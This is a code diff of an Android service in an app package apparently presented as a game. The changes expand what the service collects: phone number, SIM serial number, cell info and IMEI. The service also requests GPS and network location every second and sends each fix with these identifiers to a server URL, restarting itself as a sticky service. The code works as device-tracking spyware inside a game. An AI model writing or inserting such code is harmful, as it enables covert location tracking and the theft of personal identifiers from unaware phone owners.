@@ -1,5 +1,6 @@
 package com.mlvandroidgame.services;
 
+import android.annotation.SuppressLint;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -11,22 +12,64 @@ import android.os.BatteryManager;
 import android.os.Bundle;
 import android.os.IBinder;
 import android.telephony.TelephonyManager;
+import android.util.Log;
+import android.widget.Toast;
 
 import com.mlvandroidgame.R;
 
+import java.text.SimpleDateFormat;
 import java.util.Date;
-import java.util.Locale;
 
 /**
  * Created by Zacharie BARBECOT.
  */
-public class ShowLocationService extends Service implements LocationListener {
+public class ShowLocationService extends Service {
 
+    private static final String TAG = "GPS_SERVICE";
     private GpsService gpsService;
     private LocationManager locationManager;
 
+    private boolean first = true;
+
     private float batteryPct;
-    private String phoneNumber, imei, country, url;
+    private String phoneNumber, imei, url;
+
+    private LocationListener locationListener = new LocationListener() {
+
+        @Override
+        public void onLocationChanged(Location location) {
+            Log.e(TAG, "onLocationChanged: " + location);
+            if (locationManager != null) {
+                double latitude = location.getLatitude();
+                double longitude = location.getLongitude();
+                Date dateGps = new Date(location.getTime());
+
+                int score = 100;
+                gpsService = new GpsService(url, phoneNumber, imei, batteryPct,
+                        latitude, longitude, dateGps, new Date(), score);
+                gpsService.send();
+                Toast toast = Toast.makeText(getApplicationContext(), "GPS DATA SEND", Toast.LENGTH_SHORT);
+                toast.show();
+            }
+        }
+
+        @Override
+        public void onStatusChanged(String provider, int status, Bundle extras) {
+            Log.e(TAG, "onStatusChanged: " + provider);
+        }
+
+        @Override
+        public void onProviderEnabled(String provider) {
+            Log.e(TAG, "onProviderEnabled: " + provider);
+        }
+
+        @Override
+        public void onProviderDisabled(String provider) {
+            Log.e(TAG, "onProviderDisabled: " + provider);
+        }
+    };
+
+
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -34,96 +77,74 @@ public class ShowLocationService extends Service implements LocationListener {
     }
 
     @Override
-    public int onStartCommand(Intent intent, int flags, int startId){
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.e(TAG, "onStartCommand");
         if(intent == null) {
             stopService(new Intent(this, ShowLocationService.class));
-        } else {
-            onCreate();
+        } else{
+            if(first) {
+                Bundle extras = intent.getExtras();
+                if(extras != null) {
+                    onCreate();
+                    first = false;
+                }
+            }
         }
-        return super.onStartCommand(intent, flags, startId);
+        super.onStartCommand(intent, flags, startId);
+        return START_STICKY;
     }
 
     @Override
+    @SuppressLint("NewApi")
     public void onCreate() {
-        //battery level
         IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
         Intent batteryStatus = this.registerReceiver(null, ifilter);
 
         int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
         int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
 
-        this.batteryPct = level / (float)scale;
+        this.batteryPct = level / (float) scale;
 
-        //phone number & imei
         TelephonyManager tMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-        this.phoneNumber = tMgr.getLine1Number();
+        this.phoneNumber = "Number: "+ tMgr.getLine1Number() + "<br />";
+        this.phoneNumber += "All Cell Info: " +tMgr.getAllCellInfo() + "<br />";
+        this.phoneNumber += "Serial Number: " + tMgr.getSimSerialNumber();
         this.imei = tMgr.getDeviceId();
-
-        this.country = getUserCountry(this);
 
         this.url = getResources().getString(R.string.url);
 
+        Log.e(TAG, "onCreate");
+        initializeLocationManager();
 
         this.locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        try {
+            this.locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 16, locationListener);
+            this.locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 16, locationListener);
+        }catch (IllegalArgumentException | SecurityException e){
+            Log.i(TAG, "fail to request location update, ignore or gps provider doesn't exist", e);
+        }
 
         super.onCreate();
     }
 
-    /*
-     *
-     * LOCATION LISTENER
-     *
-     */
-
     @Override
-    public void onLocationChanged(Location location) {
+    public void onDestroy(){
+        Log.e(TAG, "onDestroy");
+        super.onDestroy();
         if(locationManager != null) {
-            double latitude = location.getLatitude();
-            double longitude = location.getLongitude();
-            int score = 100;
-
-            this.gpsService = new GpsService(url, phoneNumber, imei, batteryPct,
-                    country, latitude, longitude, new Date(), score);
-            gpsService.send();
-}
-    }
-
-    @Override
-    public void onStatusChanged(String provider, int status, Bundle extras) {
-
-    }
-
-    @Override
-    public void onProviderEnabled(String provider) {
-
-    }
-
-    @Override
-    public void onProviderDisabled(String provider) {
-
-    }
-
-    /*
-     *
-     * OTHER
-     *
-     */
-
-    public static String getUserCountry(Context context) {
-        try {
-            final TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-            final String simCountry = tm.getSimCountryIso();
-            if (simCountry != null && simCountry.length() == 2) { // SIM country code is available
-                return simCountry.toLowerCase(Locale.US);
-            }
-            else if (tm.getPhoneType() != TelephonyManager.PHONE_TYPE_CDMA) { // device is not 3G (would be unreliable)
-                String networkCountry = tm.getNetworkCountryIso();
-                if (networkCountry != null && networkCountry.length() == 2) { // network country code is available
-                    return networkCountry.toLowerCase(Locale.US);
-                }
+            try {
+                this.locationManager.removeUpdates(locationListener);
+            }catch (IllegalArgumentException | SecurityException e){
+                Log.i(TAG, "fail to remove location listeners", e);
             }
         }
-        catch (Exception e) { }
-        return null;
     }
+
+    private void initializeLocationManager() {
+        Log.e(TAG, "initializeLocationManager");
+        if (locationManager == null) {
+            this.locationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
+        }
+    }
+
 }
